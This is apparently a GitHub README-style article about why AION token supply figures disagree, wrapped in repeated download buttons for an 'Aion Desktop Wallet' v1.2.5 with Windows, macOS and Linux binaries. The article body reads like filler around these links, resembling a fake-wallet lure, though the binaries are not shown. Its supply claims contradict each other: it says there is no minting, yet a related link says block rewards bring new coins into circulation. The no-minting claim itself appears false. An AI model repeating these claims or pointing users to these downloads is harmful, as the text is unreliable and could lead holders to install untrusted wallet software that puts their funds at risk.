![Aion Wallet](assets/banner-article.png)

# Aion supply explained: why the figures differ

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Published Aion supply figures do not agree, and the disagreement is between a fixed total claimed by the project and a circulating figure reported by market data providers, which measure different things.

No single number is asserted here. What follows is what each kind of figure means, why they diverge, and how to read a supply claim without assuming one source is lying.

## You'll see this if

- Two sites show different supply numbers for AION.
- A listing page shows a market capitalisation you cannot reproduce.
- You are checking tokenomics before deciding something.
- You have seen a fixed-supply claim and a circulating figure side by side.

## The two kinds of number

Total supply is the number of tokens that exist, including those not in circulation: locked allocations, treasury holdings, unvested grants.

Circulating supply is an estimate of the tokens that are actually movable in the market. It excludes locked and reserved amounts according to a methodology the data provider chooses.

Market capitalisation is price multiplied by whichever of those a provider uses, which is why two sites can show different capitalisations for the same asset on the same day.

## Why they diverge here

The project's material describes a fixed total, while market data providers report a circulating figure that is larger than the total described in that material. Those two statements cannot both describe the same quantity, so at least one of them is using a different definition or a different source.

This guide cannot resolve which. The project does not publish a dated, sourced reconciliation of the two, and third-party providers do not explain their methodology in enough detail to reconstruct it.

## What a holder can conclude

The token has a supply that is not growing through inflation in the ordinary sense, because there is no published minting mechanism. That is consistent with the fixed-supply claim.

The exact number is not something to rely on. Anyone quoting a precise figure should be able to say which kind of supply it is, the date, and the source; without those three, the number is decoration.

## How to read a supply claim

Ask what is being counted: existing tokens, movable tokens, or a project's stated maximum.

Ask when: a supply figure without a date cannot be compared with another.

Ask who: a block explorer, an aggregator and a project's own page each answer a different question.

If a page gives a market capitalisation, check which supply it multiplied. A capitalisation computed on circulating supply and one computed on total supply can differ by a large factor, and neither is wrong as arithmetic.

## Why this matters less than it seems

Supply affects valuation arithmetic and very little else. It does not change how a wallet works, how staking pays, or whether a transaction confirms.

For a holder, the practical facts are the ones in the wallet: the balance at your address, the fee for a transfer, and the delegation if you stake. None of them depend on resolving the headline number.

## Where the figure appears

Aggregators show circulating supply and market capitalisation. Explorers show balances and, sometimes, a total derived from the chain. Project material states the intended total.

Reading all three as if they answered one question is the source of most of the confusion, and the [what is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) article sets out the network context in which the token exists.

Two other numbers get folded into supply discussions and should be kept apart. The first is which token form a figure refers to, which the [Aion ERC-20 or mainnet](https://github.com/aion-wallet/aion-explained/blob/main/aion-erc-20-or-mainnet.md) article settles. The second is how much of the supply the original conversion moved, which is part of the history in the [Aion token swap closed](https://github.com/aion-wallet/aion-explained/blob/main/aion-token-swap-closed.md) guide.

## Prevention

Do not repeat a supply figure without its date and its definition. A number without either is not information.

Do not compute a valuation from a supply you cannot source. The arithmetic will be correct and the conclusion will not.

When a claim matters, go to the primary source and note what it actually says rather than what a summary says it says.

## Where new coins come from, if anywhere

A chain with no minting mechanism adds no coins beyond what it started with, and block rewards in that design move existing coins rather than create them. Aion's rewards are paid to miners and stakers from the protocol's own accounting, and no inflation schedule is published.

That is the structural reason the fixed-supply claim is plausible, and it is also why the circulating figure deserves a definition rather than an argument. If the total is fixed, a larger circulating number implies a different starting total or a different counting method, not ongoing issuance.

How rewards are actually distributed is covered in the [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) article, which avoids the supply question and explains what a holder receives.

## Frequently asked questions

### Does AION have a fixed supply?

The project's material describes a fixed total, and no inflation mechanism is published. The precise figure is where sources diverge.

### Why is the circulating figure larger than the stated total?

That is the unresolved disagreement. Different definitions or different sources would explain it; the published material does not settle which applies.

### Is supply increasing?

No minting mechanism is published, so ordinary inflation is not part of the design. That is separate from the accounting disagreement above.

### Where should I check the current number?

An explorer for on-chain balances and an aggregator for a market estimate, read together with the date and the definition attached to each.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [What is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) - the network and its token.
- [Aion ERC-20 or mainnet](https://github.com/aion-wallet/aion-explained/blob/main/aion-erc-20-or-mainnet.md) - which token a supply figure is about.
- [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) - how new coins enter circulation through block rewards.
- [Is Aion still active](https://github.com/aion-wallet/aion-explained/blob/main/is-aion-still-active.md) - what can be verified today.
